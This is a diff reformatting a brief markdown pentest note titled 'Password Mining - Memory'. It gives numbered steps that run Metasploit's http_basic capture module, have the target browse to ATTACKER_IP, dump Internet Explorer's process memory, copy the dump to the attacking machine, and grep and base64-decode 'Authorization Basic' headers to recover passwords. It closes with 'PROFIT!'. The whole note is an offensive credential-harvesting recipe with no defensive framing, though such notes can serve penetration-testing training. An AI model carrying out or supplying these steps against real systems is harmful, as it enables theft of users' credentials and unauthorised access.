@@ -1,23 +1,39 @@
-# Steps:
+# Password Mining - Memory
 
-#### 1: msfconsole
+## Steps:
 
-#### 2: use auxiliary/server/capture/http_basic
+#### 1: 
 
-#### 3: set uripath x
+    msfconsole
 
-#### 4: run
+#### 2: 
+
+    use auxiliary/server/capture/http_basic
+
+#### 3: 
+
+    set uripath x
+
+#### 4: 
+
+    run
 
 #### 5: On target, browse to http://ATTACKER_IP/x
 
-#### 6: taskmgr
+#### 6: 
+
+    taskmgr
 
 #### 7: Right-click "iexplore.exe" in the "Image Name" abd select "Create Dump File"
 
 #### 8: Copy dump file to attacking machine
 
-#### 9: Strings /path/to/dumpfile | grep "Authorization Basic"
+#### 9: 
 
-#### 10: echo -ne BASE64 STRING | base64 -d
+    Strings /path/to/dumpfile | grep "Authorization Basic"
+
+#### 10: 
+
+    echo -ne BASE64 STRING | base64 -d
 
 #### 11: PROFIT!
